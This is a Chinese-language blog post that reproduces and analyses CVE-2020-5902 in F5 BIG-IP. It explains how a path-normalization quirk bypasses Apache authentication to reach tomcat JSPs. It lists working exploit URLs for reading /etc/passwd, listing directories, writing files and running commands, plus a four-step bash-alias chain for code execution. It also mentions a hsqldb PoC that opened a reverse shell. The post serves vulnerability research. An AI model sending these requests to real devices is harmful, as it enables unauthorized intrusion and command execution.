<!DOCTYPE html>
<html>

<head>
  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
  <title>CVE-2020-5902 F5 BIG-IP RCE复现分析 | Hexo</title>
  <meta name="description" content="" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="MobileOptimized" content="320" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" type="text/css" href="/css/component.css" />
  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
  <meta name="generator" content="Hexo">
  <script src="http://static.duoshuo.com/embed.js"></script>
  
  
  

  

</head>
<body>
<div class="container">
    <div class="mp-pusher" id="mp-pusher">
        <i id="scroll-up" class="fa fa-angle-up"></i>
        <nav id="mp-menu" class="mp-menu">
            <div class="mp-level">
                <a data-pjax class="back-home" style="font-size: 20px" href="/"><h2 ><i class="fa fa-home"></i>
                        Home</h2></a>
                <ul class="first-level">
                    <li>
                        <a class="fa fa-archive" href="#"><i class="fa fa-angle-left">
                            </i>&nbsp;&nbsp;Archive</a>
                        <div class="mp-level page-list">
                            <h2 ><i class="fa fa-archive"></i>
                                Archive</h2>
                            <a class="mp-back" href="#">back</a>
                            <form id="search-form" action="">
                                <input type="text" class="search search-archive" placeholder="Search.."/>
                            </form>
                            <ul>
                                <div class="mp-scroll">
                                
                                <li class="search-archive-li mp-pjax">
                                    <a href="/2020/08/24/JDK多版本切换/">JDK多版本切换</a>
                                </li>
                                
                                <li class="search-archive-li mp-pjax">
                                    <a href="/2020/08/24/shiro-权限绕过漏洞合集/">shiro 权限绕过漏洞合集</a>
                                </li>
                                
                                <li class="search-archive-li mp-pjax">
                                    <a href="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE复现分析/">CVE-2020-5902 F5 BIG-IP RCE复现分析</a>
                                </li>
                                
                                <li class="search-archive-li mp-pjax">
                                    <a href="/2020/08/06/Laravel-Cookie-Security漏洞分析/">Laravel Cookie Security漏洞分析</a>
                                </li>
                                
                                <li class="search-archive-li mp-pjax">
                                    <a href="/2020/04/25/git-CVE-2020-5260分析/">git CVE-2020-5260分析</a>
                                </li>
                                
                                <li class="search-archive-li mp-pjax">
                                    <a href="/2020/04/25/hello-world/">Hello World</a>
                                </li>
                                
                                </div>
                            </ul>
                        </div>
                    </li>
                    <li>
                        <a class="fa fa-copy" href="#"><i class="fa fa-angle-left">
                            </i>&nbsp;&nbsp;Categories</a>

                        <div class="mp-level page-list">
                            <h2 ><i class="fa fa-copy"></i>
                                Categories</h2>
                            <a class="mp-back" href="#">back</a>
                            <form id="search-form" action="">
                                <input type="text" class="search search-category" placeholder="Search.."/>
                            </form>
                            <ul>
                                <div class="mp-scroll">
                                
                                </div>
                            </ul>
                        </div>
                    </li>
                    <li>
                        <a class="fa fa-tags" href="#"><i class="fa fa-angle-left">
                            </i>&nbsp;&nbsp;Tags</a>
                        <div class="mp-level page-list">
                            <h2 ><i class="fa fa-tags"></i>
                                Tags</h2>
                            <a class="mp-back" href="#">back</a>
                            <form id="search-form" action="">
                                <input type="text" class="search search-tag" placeholder="Search.."/>
                            </form>
                            <ul>
                                <div class="mp-scroll">
                                
                                </div>
                            </ul>
                        </div>
                    </li>
                    
                    <li class="mp-pjax"><a class="fa fa-user" href="/about">&nbsp;&nbsp;&nbsp;About me</a></li>
                    <li><a class="fa fa-github" href="#">&nbsp;&nbsp;&nbsp;Github</a></li>

                </ul>

            </div>
        </nav>
        <div id="pjax">
            <div class="pjax-hidden" style="display: none">
                
                    <a  data-pjax href="/2020/08/24/JDK多版本切换/">JDK多版本切换</a>
                
                    <a  data-pjax href="/2020/08/24/shiro-权限绕过漏洞合集/">shiro 权限绕过漏洞合集</a>
                
                    <a  data-pjax href="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE复现分析/">CVE-2020-5902 F5 BIG-IP RCE复现分析</a>
                
                    <a  data-pjax href="/2020/08/06/Laravel-Cookie-Security漏洞分析/">Laravel Cookie Security漏洞分析</a>
                
                    <a  data-pjax href="/2020/04/25/git-CVE-2020-5260分析/">git CVE-2020-5260分析</a>
                
                    <a  data-pjax href="/2020/04/25/hello-world/">Hello World</a>
                
                
                
                <a data-pjax class="fa fa-user" href="/about">&nbsp;&nbsp;&nbsp;About me</a>
            </div>
            <nav class="nexus">
                <li  style="border-left: 1px solid #c6d0da;">
                    <a id="trigger" href="#"><i class="fa fa-bars"></i></a>
                </li>
                <li ><a id="nexus-back" data-pjax href="/">Hexo</a></li>
                
                <div id="nav-container">
                    <div class="post-navbar" style="line-height: 63px;display:none">
                        <li id="navbar-title"><a href="#">CVE-2020-5902 F5 BIG-IP RCE复现分析</a></li>
                        <li id="navbar-toc" style="border-left: none">
                            <a style="padding-right: 15px">
                                <span id="toc-content" >Introduction</span><i class="fa fa-chevron-down" ></i>
                            </a>
                            <div class="hidden-box">
                                <ul id="toc"></ul>
                            </div>
                        </li>
                    </div>
                </div>
                
            </nav>

            <div class="scroller">
            <div class="scroller-inner">


<!-- -->
<!--<body class="post-template">-->
<!---->
  

<main class="content" role="main">
    <article class="post" >
    <span class="post-meta">
                  <div class="tag-tile">
                      
                  </div>
                <h1 class="post-title" style="margin: 14px 0;color:#50585D">CVE-2020-5902 F5 BIG-IP RCE复现分析</h1>

                    <div class="post-meta">
                        Post on<span class="fa fa-clock-o"></span>
                        <time datetime="2020-08-06T13:42:50.000Z"
                              itemprop="datePublished">2020-08-06</time>
                    </div>
    </span>

        <section class="post-content">
            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2020-5902:F5 BIG-IP网上对于tmui和hsqldb的利用已经写的很详细，在此记录了对该漏洞复现过程中的问题。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这篇文章中<a href="https://xz.aliyun.com/t/8008" target="_blank" rel="noopener">https://xz.aliyun.com/t/8008</a> 写了完整的搭建环境过程，不再赘述。<br>tumi模块公开的几个利用点有文件读取、列目录、写文件、执行命令  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileRead.jsp?fileName&#x3D;&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;directoryList.jsp?directoryPath&#x3D;&#x2F;usr&#x2F;local&#x2F;www&#x2F;</span><br><span class="line">&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;fileSave.jsp?fileName&#x3D;&#x2F;tmp&#x2F;cmd&amp;content&#x3D;id</span><br><span class="line">&#x2F;tmui&#x2F;login.jsp&#x2F;..;&#x2F;tmui&#x2F;locallb&#x2F;workspace&#x2F;tmshCmd.jsp?command&#x3D;list+auth+user</span><br></pre></td></tr></table></figure>

<p>重点看rce的利用过程：</p>
<ol>
<li>tmshCmd.jsp?command=create+cli+alias+private+list+command+bash  //将list命令设置成bash</li>
<li>fileSave.jsp?fileName=/tmp/cmd&amp;content=id      //利用写文件把要执行的命令写入/tmp目录</li>
<li>tmshCmd.jsp?command=list+/tmp/cmd           //再调用list执行写入的脚本</li>
<li>tmshCmd.jsp?command=delete+cli+alias+private+list   //执行完恢复list命令</li>
</ol>
<p>命令执行复现最开始没成功，第1步和第3步的命令需要多试几遍才成功。</p>
<p>hsqldb利用方式，通过远程访问并利用org.hsqldb.util.scriptool.main自身的反序列化Gadget来实现RCE<br>使用<a href="https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902" target="_blank" rel="noopener">poc</a> 复现失败 ，应该是由于靶机自签名的证书导致连接失败</p>
<img src="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/connection_error.png" class="">

<p>利用<a href="https://github.com/longofo/hsqldb-source" target="_blank" rel="noopener">源码</a> 在本地搭建测试环境，使用上述PoC稍作改动后复现成功</p>
<img src="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/local_rce.png" class="">

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>从靶机中可以看到该web服务是apache2 + tomcat ajp方式运行。</p>
<h3 id="几处关键的配置文件"><a href="#几处关键的配置文件" class="headerlink" title="几处关键的配置文件"></a>几处关键的配置文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#proxy_ajp.conf</span><br><span class="line">ProxyPassMatch ^&#x2F;tmui&#x2F;(.*\.jsp.*)$ ajp:&#x2F;&#x2F;localhost:8009&#x2F;tmui&#x2F;$1 retry&#x3D;5</span><br><span class="line">ProxyPassMatch ^&#x2F;tmui&#x2F;Control&#x2F;(.*)$ ajp:&#x2F;&#x2F;localhost:8009&#x2F;tmui&#x2F;Control&#x2F;$1 retry&#x3D;5</span><br><span class="line">ProxyPassMatch ^&#x2F;tmui&#x2F;deal&#x2F;?(.*)$ ajp:&#x2F;&#x2F;localhost:8009&#x2F;tmui&#x2F;deal&#x2F;$1 retry&#x3D;5</span><br><span class="line">ProxyPassMatch ^&#x2F;tmui&#x2F;graph&#x2F;(.*)$ ajp:&#x2F;&#x2F;localhost:8009&#x2F;tmui&#x2F;graph&#x2F;$1 retry&#x3D;5</span><br><span class="line">ProxyPassMatch ^&#x2F;tmui&#x2F;service&#x2F;(.*)$ ajp:&#x2F;&#x2F;localhost:8009&#x2F;tmui&#x2F;service&#x2F;$1 retry&#x3D;5</span><br><span class="line">ProxyPassMatch ^&#x2F;hsqldb(.*)$ ajp:&#x2F;&#x2F;localhost:8009&#x2F;tmui&#x2F;hsqldb$1 retry&#x3D;5</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># http.conf</span><br><span class="line">&lt;Location &#x2F;hsqldb&gt;</span><br><span class="line">&lt;RequireAll&gt;</span><br><span class="line">    AuthType Basic</span><br><span class="line">    AuthName &quot;BIG\-IP&quot;</span><br><span class="line">    AuthPAM_Enabled on</span><br><span class="line">    AuthPAM_IdleTimeout 1200</span><br><span class="line">    require valid-user</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;&#x2F;RequireAll&gt;</span><br><span class="line">&lt;&#x2F;Location&gt;</span><br><span class="line">&lt;Location &#x2F;tmui&gt;</span><br><span class="line">    ......</span><br><span class="line">&lt;RequireAll&gt;</span><br><span class="line">    AuthType Basic</span><br><span class="line">    AuthName &quot;Restricted area&quot;</span><br><span class="line">    AuthPAM_Enabled on</span><br><span class="line">    AuthPAM_ExpiredPasswordsSupport on</span><br><span class="line">    AuthPam_ValidateIP On</span><br><span class="line">    AuthPAM_IdleTimeout 1200</span><br><span class="line">    AuthPAM_DashboardTimeout Off</span><br><span class="line">    require valid-user</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;&#x2F;RequireAll&gt;</span><br><span class="line">&lt;&#x2F;Location&gt;</span><br></pre></td></tr></table></figure>
<p>在http.conf中配置对<code>/hsqldb</code>和<code>/tmui</code>进行pam认证，然后通过mod_ajp将相关请求转发给tomcat。</p>
<h3 id="那apache中如何处理认证授权呢？"><a href="#那apache中如何处理认证授权呢？" class="headerlink" title="那apache中如何处理认证授权呢？"></a>那apache中如何处理认证授权呢？</h3><p>对<code>mod_f5_auth_cookie.so</code>进行逆向分析，根据对关键字<code>login.jsp</code>的定位以及对函数调用关系分析，最终定位到函数<code>ap_hook_check_access_ex</code></p>
<img src="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/check_access.png" class="">

<p>调用处理权限的函数sub_1C40，重点关注login.jsp的处理逻辑</p>
<img src="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/sub_1c40.png" class="">

<p>对其中几个函数进行了分析标注，check_need_auth函数如下：</p>
<img src="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/check_need_auth.png" class="">

<p>check_need_emtoken_url中检测需要token的url：<code>/iControl/</code>、<code>/mgmt/</code>、<code>/api</code>、<code>/em_images/</code>、<code>/em_ucs/</code>、<code>/em_log_audit</code>、<code>/em_monitoring_db/</code>、<code>/em_export/</code>、<code>/em/</code><br>check_notneed_auth_url中检测不需要权限的url: <code>/tmui/login.jsp</code>、<code>/xui/common/</code>、<code>/tmui/tmui/login/</code>、<code>/xui/modals/</code><br>注：这里的字符串比较有点奇怪，第一个字符好像不影响匹配结果。  </p>
<p>所以通过<code>/tmui/login.jsp/xxxx</code>可以绕过apache层的权限验证，同理还有<code>/xui/common/xxx</code>。但由于要转发到tomcat层，能够利用的仅有<code>/tmui/login.jsp</code>和<code>/tmui/tmui/login/</code>。<br>所以这里有个新的poc，原理同<code>/tmui/login.jsp</code><br><code>/tmui/tmui/login/..;/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/www/</code></p>
<h3 id="tomcat中如何解析url并处理对应jsp？"><a href="#tomcat中如何解析url并处理对应jsp？" class="headerlink" title="tomcat中如何解析url并处理对应jsp？"></a>tomcat中如何解析url并处理对应jsp？</h3><p>处理url的过程在tomcat容器内部 <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf</a>，然后根据web.xml寻找对应的servlet执行。</p>
<img src="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/web_xml.png" class="">

<p>根据<a href="https://xz.aliyun.com/t/8008" target="_blank" rel="noopener">https://xz.aliyun.com/t/8008</a> ，请求是先进入com.f5.controller.ControlServlet，再其中进行权限校验后才根据mapping调用对应的servlet，此处存在一些疑问。</p>
<h3 id="整个处理流程"><a href="#整个处理流程" class="headerlink" title="整个处理流程"></a>整个处理流程</h3><p>tmui模块的流程： </p>
<ul>
<li>访问 <code>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code>  </li>
<li>apache匹配到<code>/tmui/</code>，调用so进行身份认证  </li>
<li>so中检测到访问的路径是<code>/tmui/login.jsp</code>，放行  </li>
<li>apache proxy模块匹配到^/tmui/(.<em>.jsp.</em>)，将其转发到tomcat ajp  </li>
<li>tomcat解析url后变成<code>/tmui/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd</code>  </li>
</ul>
<p>hsqldb模块的流程：  </p>
<ul>
<li>访问<code>/hsqldb;</code></li>
<li>apache不会匹配到<code>/hsqldb</code>，也就不会调用so进行身份认证</li>
<li>apache2 proxy模块匹配到<code>^/hsqldb(.*)$</code>，将其转发到tomcat ajp</li>
</ul>
<h3 id="后端jsp脚本"><a href="#后端jsp脚本" class="headerlink" title="后端jsp脚本"></a>后端jsp脚本</h3><p>主要是通过<code>tmui/locallb/workspace</code>模块下的几个jsp脚本进行利用，相关分析文章很多，原理也很简单，这里不再赘述。部分文章中提到此利用方式需要近期有用户登录，相关限制代码未看到详细说明，存疑。</p>
<h3 id="编写python-PoC"><a href="#编写python-PoC" class="headerlink" title="编写python PoC"></a>编写python PoC</h3><p>网上公开的PoC多是tmui模块，没有找到hsqldb模块python版本的PoC，所以写了个pocsuite插件。相关请求中的数据包结构Longofo在文章中已经写得很清楚，直接构造数据包使用requests发包即可。但此处有点坑，本地搭建的hsqldb环境会报400 bad request，经测试是由请求头中的user-agent、accept等请求头导致的。在靶机环境中请求正常<br>利用PoC成功反弹shell</p>
<img src="/2020/08/06/CVE-2020-5902-F5-BIG-IP-RCE%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/shell.png" class="">

<p>文章中的相关文件及PoC可<a href="https://github.com/hex0wn/learn-java-bug/tree/master/f5-bigip" target="_blank" rel="noopener">在此下载</a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/8008" target="_blank" rel="noopener">https://xz.aliyun.com/t/8008</a><br><a href="https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902" target="_blank" rel="noopener">https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902</a><br><a href="https://xz.aliyun.com/t/7544" target="_blank" rel="noopener">https://xz.aliyun.com/t/7544</a><br><a href="https://www.anquanke.com/post/id/210706" target="_blank" rel="noopener">https://www.anquanke.com/post/id/210706</a><br><a href="https://www.freebuf.com/vuls/243539.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/243539.html</a></p>

        </section>
        <hr/>
        <nav class="pagination" style="width:auto" role="pagination">
            
            <a data-pjax class="newer-posts" href="/2020/08/24/shiro-权限绕过漏洞合集/">← Prev Post</a>
            
            <a class="share-button" data-original-title title>Share this Post</a>
            
            <a data-pjax class="older-posts" href="/2020/08/06/Laravel-Cookie-Security漏洞分析/">Next Post →</a>
            
        </nav>
        <br/>
        <br/>
        <section id="comment">
            <div id="comment-box"></div>
        </section>


    </article>
</main>


  
<footer class="site-footer">
    
    <div class="inner">
        <section class="copyright"><a href="/"></a> &copy; Hexo 2014</section>
        <section class="poweredby">Published with <a target="_blank" href="http://hexo.io/">Hexo   </a> and Theme by <a target="_blank" href="https://github.com/yuche/hexo-theme-kael">Kael</a></section>
    </div>
</footer>
</div>
</div><!-- /scroller -->

</div><!-- /pusher -->
</div><!-- /container -->
</div>

<!-- Easter eggs -->

<div class="egg animated">
    <a id="close-button" href="#">X</a>
    <div class="block">
        <div class="loading">
            <span class="ball1"></span>
            <span class="ball2"></span>
        </div>
    </div>
</div>
  
<script src="//cdn.staticfile.org/jquery/1.11.0/jquery.min.js"></script>
<script>
    if (!window.jQuery) {
        var script = document.createElement('script');
        script.src = "/js/jquery.min.js";
        document.body.appendChild(script);
    }
</script>
<script type="text/javascript" src="/js/lib.js"></script>
<script type="text/javascript" src="/js/main.js"></script>







</body>
</html>
